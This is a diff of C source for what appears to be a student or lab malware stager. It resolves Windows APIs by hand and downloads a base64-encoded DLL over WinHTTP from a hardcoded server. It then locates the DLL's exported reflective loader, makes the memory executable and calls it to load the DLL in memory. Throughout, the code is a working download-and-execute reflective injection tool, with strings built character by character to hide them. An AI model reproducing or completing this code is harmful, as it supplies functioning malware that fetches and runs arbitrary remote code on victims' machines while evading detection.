@@ -1,6 +1,9 @@
 #include "addresshunter.h"
 #include <winnt.h>
-//
+
+typedef ULONG_PTR (WINAPI *REFLECTIVELOADER)();
+typedef BOOL (WINAPI *DLLMAIN)(HINSTANCE, DWORD, LPVOID);
+
 // kernel32.dll exports
 typedef HMODULE(WINAPI *LOADLIBRARYA)(LPCSTR lpLibFileName);
 typedef BOOL(WINAPI *CLOSEHANDLE)(HANDLE);
@@ -98,6 +101,19 @@ typedef struct DLL_ {
     DWORD Size;
 } DLL, * PDLL;
 
+
+size_t base64_raw_size(size_t len) {
+    size_t padding = 0;
+
+    // Determine padding based on the length of the Base64 string
+    if (len > 0) {
+        padding = (len % 4 == 0) ? 0 : (4 - (len % 4));
+    }
+
+    // Calculate the raw size
+    return (len * 3) / 4 - padding;
+}
+
 void * myMemcpy (void *dest, const void *src, size_t len)
 {
   char *d = dest;
@@ -170,10 +186,8 @@ LPVOID winHTTPClient(PAPI api, PDWORD pdwDllSize) {
     };
     */
 
-    /*
     // School
-    WCHAR wServer[14] = {'1', '4', '5', '.', '9', '3', '.', '5', '3', '.', '2', '1', '5', 0};
-    */
+    //WCHAR wServer[14] = {'1', '4', '5', '.', '9', '3', '.', '5', '3', '.', '2', '1', '5', 0};
 
     // Host-Only
     WCHAR wServer[12] = {'1', '9', '2', '.', '1', '6', '8', '.', '0', '.', '1', 0};
@@ -182,6 +196,7 @@ LPVOID winHTTPClient(PAPI api, PDWORD pdwDllSize) {
     WCHAR wProxyBypass[] = {'W', 'I', 'N', 'H','T','T','P', '_', 'N','O','_','P','R','O','X','Y','_','B','Y','P','A','S','S',0};
 
     INTERNET_PORT dwPort = 5001;
+    DWORD dwEncodedDllSize;
 
     HINTERNET hSession = ((WINHTTPOPEN)api->WinHttpOpen)(
         wUserAgent,
@@ -264,8 +279,7 @@ LPVOID winHTTPClient(PAPI api, PDWORD pdwDllSize) {
     // Calculates the needed buffer length for the content length string if the 4th param is null and returns ERROR_INSUFFICIENT_BUFFER
     ((WINHTTPQUERYHEADERS)api->WinHttpQueryHeaders)(hRequest, WINHTTP_QUERY_CONTENT_LENGTH, WINHTTP_HEADER_NAME_BY_INDEX, NULL, &dwBufferLength, WINHTTP_NO_HEADER_INDEX);
 
-    #define ERROR_INSUFFICIENT_BUFFER __MSABI_LONG(122)
-    if (((GETLASTERROR)api->GetLastError)() == 122)
+    if (((GETLASTERROR)api->GetLastError)() == ERROR_INSUFFICIENT_BUFFER)
     {
         // Allocate the calculated buffer
         lpContentLength = ((MALLOC)api->malloc)(dwBufferLength/sizeof(WCHAR));
@@ -274,14 +288,14 @@ LPVOID winHTTPClient(PAPI api, PDWORD pdwDllSize) {
     }
 
     if (result) {
-        *pdwDllSize = ((STRTOINTW)api->StrToIntW)((WCHAR*)lpContentLength);
+        dwEncodedDllSize = ((STRTOINTW)api->StrToIntW)((WCHAR*)lpContentLength);
     }
     else {
         CHAR error[] = { 'Q', 'u', 'e', 'r', 'y', 'H', 'e', 'a', 'd', 'e', 'r', ' ', 'F', 'a', 'i', 'l', 0 };
         ((MESSAGEBOXA)api->MessageBoxA)(0, error, error, 0x0L);
     }
 
-    LPVOID lpEncodedBuffer = (LPVOID)((CALLOC)api->calloc)((size_t)(*pdwDllSize), (size_t)sizeof(WCHAR));
+    LPVOID lpEncodedBuffer = (LPVOID)((CALLOC)api->calloc)((size_t)(dwEncodedDllSize), (size_t)sizeof(WCHAR));
     WCHAR* wcEncodedBuffer = (WCHAR*)lpEncodedBuffer;
     DWORD bufferIndexChange = 0;
     DWORD availableBytes = 0;
@@ -297,7 +311,7 @@ LPVOID winHTTPClient(PAPI api, PDWORD pdwDllSize) {
             lpActuallyRead
         );
         // Check for buffer overflow risk
-        if (bufferIndexChange + (availableBytes / sizeof(WCHAR)) > *pdwDllSize / sizeof(WCHAR)) {
+        if (bufferIndexChange + (availableBytes / sizeof(WCHAR)) > dwEncodedDllSize / sizeof(WCHAR)) {
             break;
         }
         bufferIndexChange += availableBytes/sizeof(WCHAR);
@@ -343,10 +357,15 @@ LPVOID winHTTPClient(PAPI api, PDWORD pdwDllSize) {
 
     //((MESSAGEBOXA)api->MessageBoxA)(NULL, lpEncodedBuffer, lpEncodedBuffer, 0x0000000L);
 
-    LPVOID lpRawBuffer = (LPVOID)(((CALLOC)api->calloc)((size_t)(*pdwDllSize), (size_t)sizeof(WCHAR)));  // Convert base64 to bytes
-    DWORD lengthBuffer = ((CRYPTSTRINGTOBINARYA)api->CryptStringToBinaryA)((LPVOID)lpEncodedBuffer, *pdwDllSize, 0x000000001, lpRawBuffer, pdwDllSize, NULL, NULL);
+    //((WPRINTF)api->wprintf)(L"dwEncodedDllSize: %d\n", dwEncodedDllSize);
+    *pdwDllSize = base64_raw_size(dwEncodedDllSize);
+    //((WPRINTF)api->wprintf)(L"pdwDllSize: %d\n", *pdwDllSize);
+    LPVOID lpRawBuffer = (LPVOID)(((CALLOC)api->calloc)(*pdwDllSize, (size_t)sizeof(CHAR)));
 
-    ((FREE)api->free)((LPVOID)lpEncodedBuffer);
+    //DWORD lengthBuffer = ((CRYPTSTRINGTOBINARYA)api->CryptStringToBinaryA)((LPVOID)lpEncodedBuffer, dwEncodedDllSize, 0x000000001, lpRawBuffer, &dwEncodedDllSize, NULL, NULL);
+    DWORD lengthBuffer = ((CRYPTSTRINGTOBINARYA)api->CryptStringToBinaryA)(lpEncodedBuffer, dwEncodedDllSize, 0x000000001, lpRawBuffer, pdwDllSize, NULL, NULL);
+
+    ((FREE)api->free)(lpEncodedBuffer);
     ((FREE)api->free)(lpContentLength);
 
     return lpRawBuffer;
@@ -382,7 +401,6 @@ UINT_PTR GetRLOffset(PAPI api, PVOID lpDll) {
 
     uiExportDirectoryData = (UINT_PTR) &((PIMAGE_NT_HEADERS64)uiNtHeaders)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
 
-    // DEBUG: ExportDirectoryData is correct
     //ExportDirectoryData = OptionalHeaders.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
     //ExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(uiDll + Rva2Offset(ExportDirectoryData.VirtualAddress, uiDll));
     UINT_PTR uiExportDirectory = uiDll + Rva2Offset(((PIMAGE_DATA_DIRECTORY)uiExportDirectoryData)->VirtualAddress, uiDll);
@@ -436,8 +454,6 @@ UINT_PTR GetRLOffset(PAPI api, PVOID lpDll) {
     // address. I *believe* reading the base address from the NT header //
     // and adding the relative virtual address to it would work as well //
     // However, I am not sure if it actually would as I did not test it //
-
-    dwNumberOfEntries = ((PIMAGE_EXPORT_DIRECTORY)uiExportDirectory)->NumberOfNames;
     functionNameAddresses = uiDll + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDirectory)->AddressOfNames, uiDll);
     functionOrdinals = uiDll + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDirectory)->AddressOfNameOrdinals, uiDll);
     functionAddresses = uiDll + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDirectory)->AddressOfFunctions, uiDll);
@@ -445,7 +461,6 @@ UINT_PTR GetRLOffset(PAPI api, PVOID lpDll) {
     CHAR* exportedFunctionName = {0};
     while(dwNumberOfEntries--) {
         exportedFunctionName = (CHAR*)(uiDll + Rva2Offset(DEREF(functionNameAddresses), uiDll));
-        // TODO: String compare doesn't work, it can't match the RL's name
         if (my_strcmp(exportedFunctionName, (CHAR*)rlName) == 0)
         {
             CHAR error1[] = { 'R', 'L', ' ', 'N', 'o', 't', ' ', 'F', 'o', 'u', 'n', 'd', 0 };
@@ -466,7 +481,7 @@ UINT_PTR GetRLOffset(PAPI api, PVOID lpDll) {
             // address. It will be used to pass to CreateThread as it's
             // fourth parameter (thread s tarting point) //
             functionAddresses += DEREF_16(functionOrdinals) * sizeof(DWORD);
-            rlAddress = uiDll + Rva2Offset(DEREF_32(functionAddresses), uiDll);
+            rlAddress = Rva2Offset(DEREF_32(functionAddresses), uiDll);
             break;
         }
     }
@@ -495,23 +510,54 @@ UINT_PTR GetRLOffset(PAPI api, PVOID lpDll) {
 }
 
 void inject(PAPI api, LPVOID lpDll, DWORD dwDllSize) { //
-     //NOTE: You already have the buffer dummy. You don't
-     //need reallocation as it'll be a local thread
-    //((VIRTUALALLOC)api->VirtualAlloc)(NULL, sizeof(*pDll), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    //((CREATETHREAD)api->CreateThread)(NULL, 0, )
-    UINT_PTR loaderOffset;
+    DWORD loaderOffset;
+    REFLECTIVELOADER pReflectiveLoader;
+    DLLMAIN pDllMain;
 
     loaderOffset = GetRLOffset(api, lpDll);
 
-    WCHAR loader[] = { 'L', 'o', 'a', 'd', 'e', 'r', 'O', 'f', 'f', 's', 'e', 't', ':', '%', 'p', '\n', 0 };
-    ((WPRINTF)api->wprintf)(loader, loaderOffset);
+    //WCHAR loader[] = { 'L', 'o', 'a', 'd', 'e', 'r', 'O', 'f', 'f', 's', 'e', 't', ':', ' ', '%', 'p', '\n', 0 };
+    //((WPRINTF)api->wprintf)(loader, loaderOffset);
+    
+    WCHAR loader[] = { 'L', 'o', 'a', 'd', 'e', 'r', ':', ' ', '%', 'p', '\n', 0 };
+    ((WPRINTF)api->wprintf)(loader, (UINT_PTR)lpDll + loaderOffset);
+
+
+    //((WPRINTF)api->wprintf)(L"Origin DLL location: %p\n", lpDll);
+    pReflectiveLoader = (REFLECTIVELOADER)((UINT_PTR)lpDll + loaderOffset);
 
     DWORD dwOldProtect;
     ((VIRTUALPROTECT)api->VirtualProtect)(lpDll, dwDllSize, PAGE_EXECUTE_READWRITE, &dwOldProtect);
 
-    HANDLE hThread = ((CREATETHREAD)api->CreateThread)(NULL, 0, (LPTHREAD_START_ROUTINE)loaderOffset, NULL, 0, NULL);
-    ((WAITFORSINGLEOBJECT)api->WaitForSingleObject)(hThread, INFINITE);
-    ((CLOSEHANDLE)api->CloseHandle)(hThread);
+    HANDLE hResult = NULL;
+
+    pDllMain = (DLLMAIN)pReflectiveLoader();
+    CHAR text[] = {'D', 'l', 'l', 'M', 'a', 'i', 'n', 0};
+    ((MESSAGEBOXA)api->MessageBoxA)(0, text, text, 0x0L);
+
+    //WCHAR test[] = { 't', 'e', 's', 't', 0 };
+    //((WPRINTF)api->wprintf)(test);
+
+    if( pDllMain != NULL )
+	{
+		// call the loaded librarys DllMain to get its HMODULE
+		if( !pDllMain( NULL, DLL_QUERY_HMODULE, &hResult ) )
+		{
+            CHAR text[] = {'D', 'l', 'l', 'M', 'a', 'i', 'n', 'F', 'a', 'i', 'l', '1', 0};
+            ((MESSAGEBOXA)api->MessageBoxA)(0, text, text, 0x0L);
+		    hResult = NULL;
+		} else {
+            CHAR text[] = {'D', 'l', 'l', 'M', 'a', 'i', 'n', 'F', 'a', 'i', 'l', '?', 0};
+		}
+	} else
+    {
+        CHAR text[] = {'D', 'l', 'l', 'M', 'a', 'i', 'n', 'F', 'a', 'i', 'l', '2', 0};
+        ((MESSAGEBOXA)api->MessageBoxA)(0, text, text, 0x0L);
+	}
+
+    //HANDLE hThread = ((CREATETHREAD)api->CreateThread)(NULL, 0, (LPTHREAD_START_ROUTINE)loaderOffset, NULL, 0, NULL);
+    //((WAITFORSINGLEOBJECT)api->WaitForSingleObject)(hThread, INFINITE);
+    //((CLOSEHANDLE)api->CloseHandle)(hThread);
 }
 
 void messagebox() {
@@ -601,7 +647,9 @@ void messagebox() {
     api->StrToIntW = GetSymbolAddress((HANDLE)shlwapidll, StrToIntW_c);
 
     DWORD dwDllSize;
-    LPVOID pDll = winHTTPClient(api, &dwDllSize);
-    inject(api, pDll, dwDllSize);
-    ((FREE)api->free)(pDll);
+    LPVOID pRawDll = winHTTPClient(api, &dwDllSize);
+    //((PRINTF)api->printf)("Raw dll size: %d\n", dwDllSize);
+    inject(api, pRawDll, dwDllSize);
+    ((FREE)api->free)(pRawDll);
 }
+
